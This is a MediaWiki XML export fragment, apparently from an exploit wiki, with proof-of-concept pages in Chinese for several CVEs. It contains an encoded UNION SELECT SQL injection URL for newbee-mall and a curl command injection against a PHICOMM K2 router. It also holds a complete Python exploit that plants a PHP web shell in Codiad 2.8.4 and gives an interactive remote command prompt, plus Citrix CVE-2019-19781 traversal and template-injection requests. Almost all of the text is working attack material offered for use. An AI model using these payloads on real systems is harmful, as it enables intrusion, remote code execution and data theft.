      <text bytes="698" sha1="29uqs4xt8gpcwmcmoj1nbr2difz3ck0" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
newbee-mall version before 2019-10-23

==POC==
&lt;pre&gt;
http://&lt;target&gt;/search?goodsCategoryId=&amp;keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&amp;orderBy=default
&lt;/pre&gt;</text>
      <sha1>29uqs4xt8gpcwmcmoj1nbr2difz3ck0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-19117 PHICOMM K2(PSG1218) V22.5.9.163 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1352</id>
    <revision>
      <id>1692</id>
      <timestamp>2021-04-15T11:17:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; curl -i -s -k -v -X'POST'  -e "http://192.168.2.1/cgi-bin/luci/;stok=xxx/xxx/xxx/xxx" -b "sysauth=4a2c4bdba5fb1273ce62759fd42dba42" --data-binary "mode=1&amp;autoUpT..."</comment>
      <origin>1692</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="263" sha1="6tli2ukvmuwx9euqcp32oyky5yuwpy5" xml:space="preserve">==POC==
&lt;pre&gt;
curl -i -s -k -v -X'POST'  -e "http://192.168.2.1/cgi-bin/luci/;stok=xxx/xxx/xxx/xxx" -b "sysauth=4a2c4bdba5fb1273ce62759fd42dba42" --data-binary "mode=1&amp;autoUpTime=02%3A05|reboot" 'http://192.168.2.1/cgi-bin/luci/;stok=xxx/admin/xxx/xxx/xxx'
&lt;/pre&gt;</text>
      <sha1>6tli2ukvmuwx9euqcp32oyky5yuwpy5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-19208 Codiad 2.8.4 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>2751</id>
    <revision>
      <id>3250</id>
      <timestamp>2021-05-24T13:23:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (2) # Date: 21.05.2021 # Exploit Author: Ron Jost (Hacker5preme) # Credits to: https://hero..."</comment>
      <origin>3250</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3793" sha1="d327h3bhw93uyf3yroq203kg9eo8zy7" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)
# Date: 21.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Credits to: https://herolab.usd.de/security-advisories/usd-2019-0049/ (Tobias Neitzel)
# Vendor Homepage: http://codiad.com/
# Software Link: https://github.com/Codiad/Codiad/releases/tag/v.2.8.4
# Version: 2.8.4
# Tested on: Xubuntu 20.04 and Cent OS 8.3
# CVE: CVE-2019-19208

'''
Description: 
An unauthenticated attacker can inject PHP code before the initial configuration
that gets executed and therefore he can run arbitrary system commands on the server.
'''


'''
Import required modules:
'''
import requests
import json
import sys
import time


'''
User-Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]


'''
Determining target:
--&gt; The installationpaths to select from are derived from the installation instructions from:
        https://github.com/Codiad/Codiad/wiki/Installation
'''
print('Enter one of the following numbers to proceed')
print('[1]: OS of the target: Higher than Ubuntu 13.04; path: /var/www/html/')
print('[2]: OS of the target: Ubuntu 13.04 or below; path: /var/www/')
print('[3]: OS of the target: CENT OS; path: /var/www/html/')
selection = int(input('Your Choice: '))
if selection == 3 or selection == 1:
    path = "/var/www/html"
    content_len = "191"
if selection == 2:
    path = '/var/www'
    content_len = '185'


'''
Get cookie
'''
session = requests.Session()
link = 'http://' + target_ip + ':' + target_port + '/'
response = session.get(link)
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')


'''
Construct header:
'''
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.',
    'Accept': '*/*',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': content_len,
    'Origin': 'htttp://' + target_ip,
    'Connection': 'close',
    'Referer': 'http://' + target_ip + '/',
    'Cookie': cookie,
}


'''
Construct body:
'''
string = """'"); system($_GET["cmd"]); print("'"""
body = {
    'path': path,
    'username': 'test',
    'password': 'exploit',
    'password_confirm': 'exploit',
    'project_name': 'hello',
    'project_path': path + '/data',
    'timezone': str(string)
}


'''
Post the request with the malaicious payload
'''
print('Posting request with malicious payload')
link = link + '/components/install/process.php'
x = requests.post(link, headers=header, data=body)
print('Waiting 10 seconds')
time.sleep(10)


'''
Create payload / persistend command execution:
'''
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'mag-age=0'
}
payload = input('Input the command, which should be executed on the targeted machine. To abort enter EXIT: ')
while payload != 'EXIT':
    link_payload = 'http://' + target_ip + ':' + target_port + '/config.php?cmd=' + payload
    x = requests.get(link_payload, headers=header)
    print(x.text)
    payload = input('Input the command, which should be executed on the targeted machine. To abort enter EXIT: ')
&lt;/pre&gt;</text>
      <sha1>d327h3bhw93uyf3yroq203kg9eo8zy7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-19781 Citrix 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1340</id>
    <revision>
      <id>1680</id>
      <timestamp>2021-04-15T06:01:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== Citrix 13.x,12.1,12.0,11.1,10.5    ==EXP1== &lt;pre&gt; POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Host: target-ip Connection: close Accept-Encoding: gzip,..."</comment>
      <origin>1680</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="551" sha1="lc5gysywj558b5an6wva1e41yqv6vjv" xml:space="preserve">==漏洞影響==
Citrix 13.x,12.1,12.0,11.1,10.5



==EXP1==
&lt;pre&gt;
POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1
Host: target-ip
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.23.0
NSC_NONCE: nsroot
NSC_USER: ../../../netscaler/portal/templates/15ffbdca
Content-Length: 89
&lt;/pre&gt;

&lt;pre&gt;
url=http://example.com&amp;title=test&amp;desc=[% template.new('BLOCK' = 'print whoami') %]
&lt;/pre&gt;

Payload:
&lt;pre&gt;
/vpn/../vpns/portal/test.xml
&lt;/pre&gt;


==EXP2==
https://codeload.github.com/jas502n/CVE-2019-19781/zip/master</text>
      <sha1>lc5gysywj558b5an6wva1e41yqv6vjv</sha1>
    </revision>
  </page>
</mediawiki>
